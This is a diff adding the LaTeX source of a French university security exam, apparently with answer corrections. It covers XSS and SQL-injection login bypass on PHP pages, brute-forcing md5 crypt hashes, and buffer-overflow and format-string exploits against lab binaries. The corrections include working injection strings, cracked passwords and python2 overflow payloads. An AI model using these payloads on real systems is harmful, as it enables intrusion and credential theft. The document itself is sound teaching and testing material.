@@ -1,0 +1,368 @@
+
+
+
+\documentclass[a4paper,9pt]{article}
+
+\usepackage{fullpage}
+\usepackage[all]{xy}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+%\usepackage{algorithm}
+\usepackage{graphicx}
+%\usepackage[compatible,noend]{algpseudocode}
+\usepackage{latexsym}
+\usepackage{float,color}
+\usepackage{comment}
+\usepackage{xcolor}
+\usepackage{framed}
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{ Algorithme }
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme} {Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+
+\theoremstyle{definition}
+\newtheorem{exercice}{Exercice}
+%\theoremstyle{remark}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+\definecolor{shadecolor}{RGB}{200,200,200}
+
+
+
+\newenvironment{terminal}{\color{black}\begin{snugshade*}}
+{\end{snugshade*}\color{black}}
+
+
+
+%\newtheorem*{correction}{Correction}
+\excludecomment{correction}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} % \hfill  Année \the\year \\
+ \hfill C. Legrand \\
+
+\begin{center}
+  {  {\scshape \large CC2 de  S\'ecurit\'e}  \\
+    mai 2023
+}
+
+
+
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+%\hline
+
+\bigskip
+
+\bigskip
+
+
+\noindent\textit{Recommandations.}
+\begin{itemize}
+  \item Durée : 2h30. 
+\item Seuls les documents fournis sont autorisés.
+\item Pour les exercices 1,3 et 4 vous rendrez, au choix une copie papier ou numérique. Pour l'exercice 2 vous rendrez les codes sous format numérique dans une archive ou répertoire portant votre nom. 
+\end{itemize}
+
+\bigskip
+
+\begin{exercice}
+  On considère une base de données contenant les livres édités d'une maison d'édition. Cette base de données est constituées d'une table Livres qui contient les informations sur les livres et d'une table Users qui contient les logins et mot de passe des administrateurs de la base de données. 
+  \begin{enumerate}
+  \item On considère la page \verb|recherche.php| qui permet de faire une recherche dans la table Livres sur un mot clef. Via une injection faire en sorte de faire afficher un fenêtre d'alerte avec le message ``coucou''.
+    
+  \item  Toujours avec la page \verb|recherche.php|  faire en sorte de modifier le titre de la page web (le titre dans la barre de la fenêtre) en le remplaçant par \verb|Ha ha!|.
+    
+  \item La page web \verb|insertion.php| permet d'insérer des nouveaux livres dans la base de données, via une authentification préalable via un login et un mot de passe. Contourner l'authentification pour insérer un livre  de titre ``Ha ha ha!'' de l'éditeur ``Black hat'' pour l'année 2023. 
+    \end{enumerate}
+\end{exercice}
+
+\begin{correction}
+
+   \begin{enumerate}
+   \item Solution proposée
+\begin{verbatim}
+mille%' <script> alert('coucou'); </script> #'
+\end{verbatim}
+
+   \item Solution proposée (on a juste à accéder à l'élément title du document et à le modifier).
+\begin{verbatim}
+   mille%'; # <script> document.title='Ha ha!'</script> #'|
+\end{verbatim}
+   
+    \item  L'important est de le faire sur l'entrée du login  en forcant un booléén à true) et de mettre à la fin un dièse de commentaire en un guillemet qui sera fermé par celui sur le mot de passe dans la requête d'authentification.
+      \begin{verbatim}
+        login: xxx' OR '1'='1'; #'
+\end{verbatim}
+      Ensuite le mot de passe peut etre n'importe quoi, en mettant 'hey' la requête du code php est la suivante.
+      
+\end{enumerate}
+\end{correction}
+
+\bigskip
+
+
+\begin{exercice}
+  L'objectif est de casser un mot de passe à partir d'un haché par recherche exhaustive. Les hachés sont des hachés md5sum  calculés avec la fonction crypt de \verb|crypt.h| comme dans le code C ci-dessous pour le mot de passe "abcdefgh".
+  \begin{terminal}
+\begin{verbatim}
+clegrand@pc:~$ cat exemple-crypt.c
+#include <stdio.h>
+#include <crypt.h>
+
+int main()
+{
+  char *motpass="abcdefgh";  
+  char mode[200]="$3$";         
+  char *hash;
+  hash=crypt(motpass,mode);
+  printf("hache vaut=%s\n",hash); // les 4 premiers caractères indiquent
+                                  // l'algo utilisé ($3$$->md5sum)
+  return(0);
+}
+clegrand@pc:~$ gcc exemple-crypt.c -lcrypt
+clegrand@pc:~$ ./a.out 
+hache vaut=$3$$2141636b734704847575e3731fa1f2c4
+\end{verbatim}
+\end{terminal}
+\begin{enumerate}
+\item On considère les mots de passe formée sur un prénom et d'une date de naissance (dans les deux ordres possibles):
+\begin{verbatim}
+  prenomjj/mm/aaaa  ou   jj/mm/aaaaprenom
+\end{verbatim}
+En cherchant parmi les prénoms du fichier \verb|prenoms.txt| et qui est né durant les 50 dernières années. Donnez le nombre de mot de passe à tester pour pouvoir trouver le mot de passe. Proposez un code C qui effectue cette attaque brute force pour le haché suivant (le \verb|$3$$| devant indique que le haché est calculé avec md5sum:
+\begin{verbatim}
+haché = $3$$2a6b296b817bfde3395cca4a4fde192b
+\end{verbatim}
+Indication : pour convertir un entier en une chaine de caractères pensez à utilisez \verb|sprintf|, par exemple  :
+\begin{verbatim}
+int a=137;
+char s[5];
+sprintf(s,"%d",a);
+\end{verbatim}
+Autres choses potentiellement utiles :
+\begin{verbatim}
+strcat(char *s1,char *s2) qui concatène s2 à la suite de s1
+strcpy(char *s1,char *s2) qui copie s2 dans s1
+printf("%02d",a) pour écrire un entier sur deux chiffres.
+\end{verbatim}
+\item On considère un mot de passe de 10 caractères parmi a,\ldots,z,A,\ldots,Z,0,\ldots,9,\$,\% généré par la fonction suivante:
+\begin{terminal}
+\begin{verbatim}
+void gen_password(char *s)
+{
+   int i;
+   unsigned long x, y;
+   int t=time(NULL);      
+   srand(t);
+   x=(((unsigned long) rand() ) << 32) ^ ((unsigned long) rand() );
+   x=x & 0xfffffffffffffff ;
+  
+   for(i=0;i<10;i++)
+     {
+       y=(x>>(6*i)) & 0x3f;
+       // a-z
+       if( y < 26)
+        {
+         s[i]='a'+y;
+        }
+       else if( y < 52)
+        {
+         s[i]='A'+(y-26);
+        }
+       else if( y < 62)
+        {
+         s[i]='0'+(y-52);
+        }
+       else
+        {
+         s[i]='$'+(y-62);
+        }
+    }
+   s[10]='\0';
+}
+\end{verbatim}
+\end{terminal}
+Expliquez la faiblesse de cette approche et proposez un code C qui permette de casser le haché suivant:
+\begin{verbatim}
+ haché = $3$$bf9d5753b16e51f476680a16e58c4787
+\end{verbatim}
+si votre calcul est trop long, estimez le temps que prendra ce calcul (il doit se faire dans un temps raisonable).
+  \end{enumerate}
+\end{exercice}
+
+\begin{correction}
+  Le code est fourni dans un fichier, les attaques brute-force trouvent les mots de passe  ci-dessous  correspondant aux hachés de l'énoncé:
+\begin{verbatim}
+  passwd1 = n3hzYPa%FY, hash1 = $3$$bf9d5753b16e51f476680a16e58c4787
+  passwd2 = NADINE02/10/1984, hash2 = $3$$2a6b296b817bfde3395cca4a4fde192b
+\end{verbatim}
+\end{correction}
+
+\bigskip
+
+\begin{exercice}
+  Jeu de tirage aléatoire d'entiers donné dans le fichier \verb|predict-match.c| consiste à prédire le nombre de paires de valeurs égales parmi 16 valeurs entières tirées aléatoirement dans [0,100]. Le code compilé avec les options \verb|-fno-stack-protector -no-pie -g| est \verb|predict-match|.
+
+  
+
+
+  
+  \begin{enumerate}
+  \item Analysez le code et expliquez comment les variables locales de la fonction \verb|main|  sont organisées.
+  \item Donnez une commande qui permet grâce à un débordement de tampon sur les variables locales du \verb|main| de  gagner à tous les coups et expliquez ce qui se passe lors du débordement. 
+    \end{enumerate}
+  
+\end{exercice}
+
+\begin{correction}
+  Un débordement de tampon de nom permet de fixer la valeur de r, toutes les valeurs aléatoires seront alors fixe, il suffit de connaitre le nombre (ou de le déterminer par ailleurs) de paires égales et le donner.
+  Par exemple sur la machine de la maison: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa implique un r qui vant 0x61616161 et dans ce cas il y a 3 paires d'entiers égaux. 
+\end{correction}
+
+
+\bigskip
+
+\begin{exercice}
+  On considère le code \verb|predict-pileface.c|  un jeu de prédiction de pile ou face.
+\begin{terminal}
+\begin{verbatim}
+//--------------- Debut code jeu pile ou face ----------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
+
+static int points=20; // points au début
+
+int pileface(char *input)
+{
+  char PouF[72];
+  int r;
+  strcpy(PouF,input);
+  printf("Binvenu sur le jeu de pile ou face\n");            
+      
+  // lecture de l entree utilisateur
+  // stockee dans PouF
+  printf("votre prediction ");
+  printf(PouF);
+  r=rand() & 1;
+  printf(" et le lance = %c \n",r*'P'+(1-r)*'F');
+
+  // on compare avec l entree utilisateur
+  if( PouF[0] == (r*'P'+ (1-r)*'F') )
+    return(1);
+  else
+    return(0);
+}
+
+int main(int argc, char *argv[])
+{
+  int f=1;
+  srand(time(0));
+
+  if(argc >= 2)
+    {  
+      f=pileface(argv[1]);           
+      if( f == 0)
+        points=points-10;	     
+      else
+        points=points+10;
+      printf("Vos points =%d\n",points);
+    }
+  else
+    {
+      printf("Donnez votre prediction (P ou F) en argument\n");
+    }
+  return(0);
+}
+//--------------- Fin code jeu pile ou face ----------------
+\end{verbatim}
+\end{terminal}
+%\end{exercice}
+
+%
+
+\begin{enumerate}
+\item Avec code binaire \verb|predict-pileface|  compilé avec les options 
+\begin{verbatim}
+        -g  -fno-stack-protector -no-pie 
+\end{verbatim}
+  Proposer un débordement de tampon qui en retour d'appel de la fonction \verb|pileface| exécute l'instruction \verb|points=points+10|.
+\item Avec le code binaire \verb|predict-pileface1| compilé avec les options   \verb|-g  -fno-stack-protector| avec une technique vu en CM/TD expliquez comment visualiser les adresses du code et les adresses de la pile lors de l'exécution.  
+\end{enumerate}
+\end{exercice}
+
+\begin{correction}
+\begin{enumerate}
+\item L'analyse du code assemble indique que la chaine de caractères noms dans pileface commence à 0x50, c'est à dire 80 octets au dessus de rbp (et donc de savedRBP et savedRIP).
+
+On fait un débordement de tampon de 88 octs suivi de l'adresse de retour voulue, pour dérouter le programme vers l'instruction du main \verb|0x00000000004012fd| qui fait l'incrément des points. Pour effectuer le débordement on fait comme ci-dessous:
+\begin{verbatim}
+/predict-pileface $(python2 -c "print \"x\"*88+\"\xfd\x12\x40\"")
+\end{verbatim}
+\item On utilise le fait qu'une chaine de format est directement transmise par l'utilisateur. 
+Cela permet d'analyser la pile et de connaitre les adresses savedRBP et savedRIP lors de l'appel de pileface (et donc de connaitre les adresses de la pile et du code).
+Sur les machines de l'université une commande qui fonctionne est la suivante:
+\begin{verbatim}
+./predict-pileface1 $(python2 -c "print \"%lx\"+\".%lx\"*18")
+\end{verbatim}
+\end{enumerate}
+\end{correction}
+
+\end{document}
+
+
+
+
+
+
+
+\begin{exercice}[Vulnerabilite Shellshock de bash] 
+On considère ici la vulnérabilité appelée Shellshock découverte récement (Automne 2014).
+\bigskip
+
+\begin{itshape}
+Bash permet d'exporter des variables mais aussi des fonctions à destination d'autres instances de bash. L'export de fonction utilise une variable d'environnement portant le nom de la-dite fonction dont la valeur commence par "\texttt{() \{}" :
+\begin{verbatim}
+foo=(){ 
+    du code; 
+      }
+\end{verbatim}
+ 
+A l'import, il se contente aveuglément d'interpréter cela en remplaçant le signe ``='' par un espace. C'est ainsi que bash ne se limite pas à interpréter le corps de la fonction mais qu'il poursuit le parsing et exécute les commandes qui suivent la définition de la fonction. Par exemple, définir une variable d'environnement de cette sorte :
+\begin{verbatim}
+ foo=(){  du code; } commande;
+\end{verbatim}
+executera \texttt{commande} quand l'environnement sera importé par bash.
+\end{itshape}
+\vspace{0.5cm}
+
+\begin{enumerate}
+\item On considère le simple script suivant
+\begin{verbatim}
+#!/bin/bash
+NOM=$1
+echo "Bonjour $1, content de faire votre connaissance" 
+\end{verbatim}
+quel argument donner au script pour le forcer à afficher \texttt{/etc/passwd}?
+\item Discuter de l'impact de cette vulnérabilité dans les applications en ligne.
+\end{enumerate}
+
+\end{exercice}
